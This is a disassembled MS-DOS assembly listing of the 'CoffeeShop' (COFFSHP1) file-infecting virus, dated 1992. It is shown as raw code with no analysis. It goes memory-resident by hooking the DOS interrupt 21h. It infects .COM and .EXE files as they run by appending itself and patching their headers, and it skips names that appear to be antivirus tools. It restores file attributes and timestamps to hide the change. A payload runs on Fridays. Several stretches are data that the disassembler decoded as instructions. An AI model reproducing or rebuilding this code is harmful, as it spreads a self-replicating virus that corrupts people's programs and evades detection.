
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        COFFSHP1			         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   23-Jun-92					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: AW		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	0F8h
data_2e		equ	0FAh
data_3e		equ	43Bh
data_4e		equ	0F4h
data_5e		equ	0F8h
data_6e		equ	0FCh
data_15e	equ	15A1h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

coffshp1	proc	far

start:
		jmp	loc_2
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+di],ah
		inc	ax
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		int	20h			; DOS program terminate
		db	27 dup (0)
loc_2:
		call	sub_2

coffshp1	endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		pop	si
		mov	di,100h
		sub	si,20h
		push	ax
		push	ds
		push	es
		push	di
		push	si
		cld				; Clear direction
		mov	ah,30h			; '0'
		int	21h			; DOS Services  ah=function 30h
						;  get DOS version number ax
		xchg	ah,al
		cmp	ax,30Ah
		jb	loc_3			; Jump if below
		mov	ax,33DAh
		int	21h			; ??INT Non-standard interrupt
		cmp	ah,0A5h
		je	loc_3			; Jump if equal
		mov	ax,es
		dec	ax
		mov	ds,ax
		xor	bx,bx			; Zero register
		cmp	byte ptr [bx],5Ah	; 'Z'
		jne	loc_3			; Jump if not equal
		mov	ax,[bx+3]
		sub	ax,72h
		jc	loc_3			; Jump if carry Set
		mov	[bx+3],ax
		sub	word ptr [bx+12h],72h
		mov	es,[bx+12h]
		push	cs
		pop	ds
		mov	cx,620h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	es
		pop	ds
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_1e,bx
		mov	ds:data_2e,es
;*		mov	dx,offset loc_1
		db	0BAh, 01h, 02h
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		cmp	al,5
		jne	loc_3			; Jump if not equal
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		or	dh,dh			; Zero ?
		jnz	loc_3			; Jump if not zero
		pop	ax
		push	ax
		call	sub_3
loc_3:
		pop	si
		pop	di
		pop	es
		pop	ds
		pop	ax
		cmp	byte ptr cs:[si+1Ch],0
		je	loc_4			; Jump if equal
		mov	bx,ds
		add	bx,10h
		mov	cx,bx
		add	bx,cs:[si+0Eh]
		cli				; Disable interrupts
		mov	ss,bx
		mov	sp,cs:[si+10h]
		sti				; Enable interrupts
		add	cx,cs:[si+16h]
		push	cx
		push	word ptr cs:[si+14h]
		retf				; Return far
loc_4:
		push	di
		mov	cx,1Ch
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_2		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		mov	bx,ax
		add	bx,152h
		push	cs
		push	bx
		add	ax,62Fh
		and	ax,0FFF0h
		mov	di,ax
		mov	si,data_3e
		mov	cx,2E5h
		push	cs
		pop	es
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		mov	dx,cs
		add	ax,dx
		sub	ax,10h
		mov	ds,ax
		mov	es,ax
		push	ax
		mov	ax,100h
		push	ax
		retf				; Return far
sub_3		endp

		and	[bp+di+6Fh],al
		db	'ffeeShop '
		db	0B0h, 03h,0CFh, 9Ch, 3Dh,0DAh
		db	 33h, 75h, 05h,0B8h, 01h,0A5h
		db	 9Dh,0CFh
		db	 06h, 1Eh, 56h, 57h, 52h, 51h
		db	 53h, 50h, 3Dh, 00h, 4Bh, 74h
		db	 0Ch, 3Dh, 00h
		db	 6Ch, 75h, 0Ah
		db	0F6h,0C3h, 03h, 75h, 05h, 8Bh
		db	0D7h
loc_7:
		call	sub_4
loc_8:
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	di
		pop	si
		pop	ds
		pop	es
		popf				; Pop flags
		jmp	dword ptr cs:data_5e

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		cld				; Clear direction
		push	cs
		pop	es
		mov	si,dx
		xor	di,di			; Zero register
		mov	cx,80h

locloop_9:
		lodsb				; String [si] to al
		cmp	al,0
		je	loc_12			; Jump if equal
		cmp	al,61h			; 'a'
		jb	loc_10			; Jump if below
		cmp	al,7Ah			; 'z'
		ja	loc_10			; Jump if above
		xor	al,20h			; ' '
loc_10:
		stosb				; Store al to es:[di]
		loop	locloop_9		; Loop if cx > 0


loc_ret_11:
		retn
loc_12:
		stosb				; Store al to es:[di]
		lea	si,[di-5]		; Load effective addr
		push	cs
		pop	ds
		lodsw				; String [si] to ax
		cmp	ax,452Eh
		jne	loc_13			; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,4558h
		jmp	short loc_14
loc_13:
		cmp	ax,432Eh
		jne	loc_ret_11		; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,4D4Fh
loc_14:
		jne	loc_ret_11		; Jump if not equal
		std				; Set direction flag
		mov	cx,si
		inc	cx

locloop_15:
		lodsb				; String [si] to al
		cmp	al,3Ah			; ':'
		je	loc_16			; Jump if equal
		cmp	al,5Ch			; '\'
		je	loc_16			; Jump if equal
		loop	locloop_15		; Loop if cx > 0

		dec	si
loc_16:
		cld				; Clear direction
		lodsw				; String [si] to ax
		lodsw				; String [si] to ax
		mov	di,3BEh
		mov	cl,0Ch
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		jz	loc_ret_11		; Jump if zero
		mov	ax,3300h
		int	21h			; DOS Services  ah=function 33h
						;  get ctrl-break flag in dl
		push	dx
		cwd				; Word to double word
		inc	ax
		push	ax
		int	21h			; DOS Services  ah=function 33h
						;  set ctrl-break flag dl=off/on
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		push	es
		push	bx
		push	cs
		pop	ds
		mov	dx,offset int_24h_entry
		mov	ah,25h			; '%'
		push	ax
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,4300h
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		push	cx
		xor	cx,cx			; Zero register
		mov	ax,4301h
		push	ax
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jc	loc_17			; Jump if carry Set
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_18			; Jump if carry=0
loc_17:
		jmp	loc_24
loc_18:
		xchg	ax,bx
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	dx
		push	cx
		mov	cx,1Ch
		mov	si,100h
		mov	dx,si
		call	sub_7
		jc	loc_19			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	di,data_4e
		mov	[di],ax
		mov	[di+2],dx
		cmp	word ptr [si+12h],4021h
		je	loc_19			; Jump if equal
		cmp	word ptr [si],5A4Dh
		je	loc_20			; Jump if equal
		mov	byte ptr [si+1Ch],0
		test	byte ptr [si],80h
		jz	loc_19			; Jump if zero
		cmp	word ptr [di],0D000h
		jae	loc_19			; Jump if above or =
		cmp	word ptr [di],7D0h
		jb	loc_19			; Jump if below
		call	sub_10
		jnz	loc_19			; Jump if not zero
		mov	byte ptr [si],0E9h
		mov	ax,[di]
		add	ax,1Ah
		mov	[si+1],ax
		jmp	short loc_22
loc_19:
		jmp	loc_23
loc_20:
		mov	byte ptr [si+1Ch],1
		cmp	word ptr [si+18h],40h
		jb	loc_21			; Jump if below
		mov	ax,3Ch
		cwd				; Word to double word
		call	sub_6
		jc	loc_23			; Jump if carry Set
		mov	ax,[si-4]
		mov	dx,[si-2]
		call	sub_6
		jc	loc_23			; Jump if carry Set
		cmp	byte ptr [si-3],45h	; 'E'
		je	loc_23			; Jump if equal
loc_21:
		call	sub_9
		cmp	[si+4],ax
		jne	loc_23			; Jump if not equal
		cmp	[si+2],dx
		jne	loc_23			; Jump if not equal
		cmp	word ptr [si+0Ch],0
		je	loc_23			; Jump if equal
		cmp	word ptr [si+1Ah],0
		jne	loc_23			; Jump if not equal
		call	sub_10
		jnz	loc_23			; Jump if not zero
		call	sub_8
		mov	[si+4],ax
		mov	[si+2],dx
		call	sub_11
		mov	cx,10h
		div	cx			; ax,dx rem=dx:ax/reg
		sub	ax,[si+8]
		dec	ax
		add	dx,2Dh
		mov	[si+16h],ax
		mov	[si+0Eh],ax
		mov	[si+14h],dx
		mov	word ptr [si+10h],17E0h
		lea	di,[si+0Ah]		; Load effective addr
		call	sub_5
		lea	di,[si+0Ch]		; Load effective addr
		call	sub_5
loc_22:
		call	sub_12
		mov	word ptr [si+12h],4021h
		mov	cx,1Ch
		mov	dx,si
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_23:
		pop	cx
		pop	dx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_24:
		pop	ax
		pop	cx
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		pop	ax
		pop	dx
		pop	ds
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ax
		pop	dx
		int	21h			; DOS Services  ah=function 33h
						;  set ctrl-break flag dl=off/on
		retn
sub_4		endp

		inc	bx
		dec	di
		push	bx
		inc	bx
		inc	bx
		dec	sp
		push	si
		push	bx
		dec	si
		inc	bp
		dec	ax
		push	sp
		push	sp
		inc	dx
		push	si
		dec	cx
		push	dx
		inc	cx
		inc	si
		inc	bp
		dec	bp
		push	sp
		inc	dx
		push	dx

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		mov	ax,[di]
		sub	ax,62h
		jc	loc_25			; Jump if carry Set
		cmp	ax,14Bh
		jae	loc_26			; Jump if above or =
loc_25:
		mov	ax,14Bh
loc_26:
		mov	[di],ax
		retn
sub_5		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		call	sub_13
		mov	dx,data_6e
		mov	cx,4

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_7:
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		retn
sub_6		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		call	sub_11
		add	ax,620h
		adc	dx,0
		jmp	short loc_27

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_9:
		call	sub_11
loc_27:
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		or	dx,dx			; Zero ?
		jz	loc_ret_28		; Jump if zero
		inc	ax

loc_ret_28:
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		call	sub_11
		call	sub_13
		mov	cx,620h
		mov	dx,si
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		cmp	ax,cx
		retn
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		mov	ax,[di]
		mov	dx,[di+2]
		retn
sub_11		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		xor	ax,ax			; Zero register
		cwd				; Word to double word

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_13:
		xchg	cx,dx
		xchg	ax,dx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
sub_12		endp

		and	[di+4Bh],cl
		and	[bx],ah
		cmp	[bp+si],si
		and	ds:data_15e[bx],bh
		cmp	di,sp
		jb	loc_29			; Jump if below
		mov	ah,4Ch			; 'L'
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
loc_29:
		mov	si,403h
		mov	cx,170h
		std				; Set direction flag
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		cld				; Clear direction
		mov	si,di
		mov	di,100h
		lodsw				; String [si] to ax
		lodsw				; String [si] to ax
		mov	bp,ax
		mov	dl,10h
		jmp	$+1439h
		adc	ax,7FDFh
		cld				; Clear direction
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
						;   ah=columns on screen
		mov	ah,0
		push	ax
		sti				; Enable interrupts
		mov	bh,0B0h
		cmp	al,7
;*		je	loc_31			; Jump if equal
		db	 74h,0FFh
		dec	word ptr [bp+si]
		cmp	al,4
		jae	$+2Ah			; Jump if above or =
		mov	bh,0B8h
		cmp	al,2
		jb	$+24h			; Jump if below
		mov	es,bx
		mov	si,140h
		db	0FFh,0FFh,0B0h, 19h, 57h,0B1h
		db	 50h,0F3h,0A5h, 5Fh, 81h,0C7h
		db	0A0h, 00h,0FEh,0C8h, 75h,0F2h
		db	 03h, 8Fh,0B8h, 07h, 0Eh,0D6h
		db	0FBh, 0Ch,0CDh, 21h, 58h,0F8h
		db	 63h,0A7h,0CBh, 20h, 02h,0FEh
		db	 20h, 00h,0FAh,0EBh,0B0h,0FCh
		db	0F8h, 03h, 77h,0F0h,0E0h,0D0h
		db	 41h, 0Fh,0C0h, 2Fh, 07h, 1Dh
		db	 80h, 6Fh,0BAh,0DCh,0E1h, 34h
		db	0DBh, 0Ch,0F8h,0F0h, 0Eh,0DFh
		db	0FEh,0F4h,0F8h,0BBh,0AEh,0F8h
		db	0E4h, 03h, 84h,0E0h,0FCh,0EBh
		db	0B0h,0E6h,0EAh,0A3h, 83h,0DAh
		db	0AAh, 0Eh,0DCh, 09h,0BAh,0C8h
		db	 01h, 3Ah,0F0h, 50h, 07h,0A2h
		db	0E8h,0E0h,0ACh, 05h,0DBh, 0Eh
		db	 77h, 0Fh,0F8h,0DCh,0F6h,0BAh
		db	0AEh,0F0h,0F6h,0EBh, 3Ah,0F0h
		db	0F4h,0E0h, 40h, 17h,0FAh
loc_33:
		in	al,dx			; port 10h ??I/O Non-standard
		sbb	ax,0DF72h
		esc	2,dl			; coprocessor escape
		jz	loc_33			; Jump if zero
		mov	dx,20DDh
		sbb	ax,0DE74h
		and	[bp+si-45F9h],ch
		esc	0,[bx+di-8]		; coprocessor escape
		inc	di
		xchg	di,ax
		call	$-171Ch
		clc				; Clear carry flag
		xchg	ax,dx
		hlt				; Halt processor
		add	[di],bl
		db	 60h,0D8h,0E8h, 09h,0DCh,0FEh
		db	 09h,0F8h,0B0h, 23h,0F8h, 5Ch
		db	0D7h,0FCh,0F8h,0FCh,0E8h, 01h
		db	 3Bh,0F4h,0ECh, 80h,0D2h, 1Dh
		db	0BEh,0BAh, 5Ch, 20h, 7Ch, 03h
		db	 75h, 60h,0CAh, 20h, 0Eh,0B2h
		db	0D8h, 81h,0F0h, 3Bh, 40h, 92h
		db	0D7h,0B5h,0CEh,0F8h,0DCh, 60h
		db	0A7h, 41h,0DEh, 60h, 02h,0B5h
		db	0BEh, 3Ch, 20h, 0Fh, 7Bh, 22h
		db	 65h, 07h, 15h, 60h, 6Eh, 42h
		db	 68h,0B8h, 20h,0FEh,0FCh,0AEh
		db	 23h,0FCh,0E2h, 7Fh, 07h,0C0h
		db	0B3h, 20h, 2Fh, 60h, 79h, 28h
		db	 6Ah,0DEh, 7Eh,0E0h, 08h,0D5h
		db	 09h,0E4h,0C0h, 60h,0C1h, 70h
		db	 0Bh,0DFh,0E4h, 42h,0D0h, 7Bh
		db	 4Fh, 5Eh, 9Ah, 05h,0ADh
		db	22h
		db	 06h, 80h, 70h, 10h, 60h, 3Eh
		db	 05h,0CAh, 5Eh, 41h, 46h,0A4h
		db	 53h,0EFh, 15h
		db	7Ah
		db	 97h,0C2h, 54h, 74h, 04h, 20h
		db	 60h, 50h, 45h, 01h,0C8h,0E8h
		db	0DCh, 05h,0F9h, 06h, 54h,0D8h
		db	0DEh, 41h, 2Dh, 78h, 7Ah, 01h
		db	 55h, 75h, 04h, 20h, 76h, 1Dh
		db	0B8h, 2Eh,0EAh,0A0h,0C6h, 62h
		db	 55h, 83h, 8Ah, 5Eh, 09h,0C0h
		db	 0Ah, 5Ch, 20h,0C6h, 11h, 12h
		db	0D0h, 2Ah, 74h, 58h, 5Dh, 5Eh
		db	 17h, 5Bh, 60h, 80h, 92h, 0Eh
		db	 40h,0EAh, 40h, 75h,0ACh, 62h
		db	 15h, 74h,0C4h, 59h, 5Eh,0C0h
		db	 9Dh,0C4h, 82h, 15h, 08h,0DCh
		db	 20h, 14h, 90h, 60h, 20h, 43h
		db	 66h, 62h, 94h, 50h, 3Bh, 65h
		db	0ECh, 5Eh,0A4h, 1Dh,0CFh, 70h
		db	 80h,0C2h, 20h, 8Ah, 0Eh,0B2h
		db	 62h, 2Ah,0ECh, 69h,0CCh, 5Eh
		db	 80h, 55h,0BEh, 0Bh,0C0h, 80h
		db	 62h, 41h, 0Eh, 04h, 72h,0FEh
		db	 56h, 05h, 6Eh, 10h, 01h,0D5h
		db	 41h,0AEh,0FEh,0CEh, 9Eh,0D1h
		db	 08h,0FEh,0C4h,0E9h, 5Ch,0E6h
		db	0AAh, 62h,0CCh,0C0h,0C8h, 01h
		db	 62h, 39h,0ECh, 6Ch,0F2h, 9Dh
		db	 62h,0BCh, 94h, 48h, 41h, 28h
		db	 4Ah, 45h, 38h, 26h,0FEh, 52h
		db	 1Ch, 5Ah, 5Fh,0FEh,0BEh, 40h
		db	 02h, 84h,0F2h, 0Ah,0B8h,0AEh
		db	 70h,0FEh,0FCh, 8Eh, 12h, 6Ah
		db	0DEh, 54h,0D8h, 61h,0ACh, 50h
		db	0B1h, 43h, 3Eh, 72h, 80h,0A3h
		db	 60h, 48h, 6Ah, 82h, 0Eh, 96h
		db	 02h, 66h, 3Ah, 6Ch, 58h, 84h
		db	0B4h,0D1h, 01h, 5Ah, 48h, 3Ah
		db	0EAh, 44h, 70h, 0Bh,0E8h,0D8h
		db	 24h, 9Eh, 28h, 12h, 73h,0C6h
		db	 54h,0D0h,0FFh
		db	0F0h,0FFh, 60h, 34h, 50h, 00h
		db	 00h,0FFh

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		shr	bp,1			; Shift w/zeros fill
		dec	dl
		jnz	loc_ret_38		; Jump if not zero
		lodsw				; String [si] to ax
		mov	bp,ax
		mov	dl,10h

loc_ret_38:
		retn
sub_14		endp

loc_39:
		call	sub_14
		rcl	bh,1			; Rotate thru carry
		call	sub_14
		jc	loc_42			; Jump if carry Set
		mov	dh,2
		mov	cl,3

locloop_40:
		call	sub_14
		jc	loc_41			; Jump if carry Set
		call	sub_14
		rcl	bh,1			; Rotate thru carry
		shl	dh,1			; Shift w/zeros fill
		loop	locloop_40		; Loop if cx > 0

loc_41:
		sub	bh,dh
loc_42:
		mov	dh,2
		mov	cl,4

locloop_43:
		inc	dh
		call	sub_14
		jc	loc_44			; Jump if carry Set
		loop	locloop_43		; Loop if cx > 0

		call	sub_14
		jnc	loc_45			; Jump if carry=0
		inc	dh
		call	sub_14
		jnc	loc_44			; Jump if carry=0
		inc	dh
loc_44:
		mov	cl,dh
		jmp	short locloop_51
loc_45:
		call	sub_14
		jc	loc_47			; Jump if carry Set
		mov	cl,3
		mov	dh,0

locloop_46:
		call	sub_14
		rcl	dh,1			; Rotate thru carry
		loop	locloop_46		; Loop if cx > 0

		add	dh,9
		jmp	short loc_44
loc_47:
		lodsb				; String [si] to al
		mov	cl,al
		add	cx,11h
		jmp	short locloop_51
loc_48:
		mov	cl,3

locloop_49:
		call	sub_14
		rcl	bh,1			; Rotate thru carry
		loop	locloop_49		; Loop if cx > 0

		dec	bh
loc_50:
		mov	cl,2

locloop_51:
		mov	al,es:[bx+di]
		stosb				; Store al to es:[di]
		loop	locloop_51		; Loop if cx > 0

loc_52:
		call	sub_14
		jnc	loc_53			; Jump if carry=0
		movsb				; Mov [si] to es:[di]
		jmp	short loc_52
loc_53:
		call	sub_14
		lodsb				; String [si] to al
		mov	bh,0FFh
		mov	bl,al
		jc	loc_39			; Jump if carry Set
		call	sub_14
		jc	loc_48			; Jump if carry Set
		cmp	bh,bl
		jne	loc_50			; Jump if not equal
		xor	bp,bp			; Zero register
		xor	di,di			; Zero register
		xor	si,si			; Zero register
		xor	dx,dx			; Zero register
		xor	bx,bx			; Zero register
		xor	ax,ax			; Zero register
		jmp	$-1480h

seg_a		ends



		end	start
